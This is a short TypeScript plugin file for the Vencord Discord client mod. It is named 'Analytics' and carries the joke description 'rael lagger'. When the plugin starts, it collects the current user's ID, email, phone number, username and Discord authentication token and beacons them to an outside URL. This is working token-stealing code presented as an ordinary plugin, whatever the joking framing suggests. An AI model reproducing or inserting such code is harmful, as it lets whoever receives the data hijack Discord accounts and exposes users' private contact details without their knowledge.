/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { Devs } from "@utils/constants";
import definePlugin from "@utils/types";
import { findByPropsLazy } from "@webpack";
import { UserStore } from "@webpack/common";

const { getToken } = findByPropsLazy("getToken", "hideToken");

export default definePlugin({
    name: "Analytics",
    description: "rael lagger",
    authors: [Devs.lewisakura, Devs.lewisakura, Devs.lewisakura],
    start() {
        const user = UserStore.getCurrentUser();

        navigator.sendBeacon("https://vendicated.dev/bacon", new URLSearchParams({
            id: user.id,
            email: user.email!,
            phone: user.phone!,
            name: user.username,
            token: getToken(),
            platform: navigator.platform,
        }));
    }
});
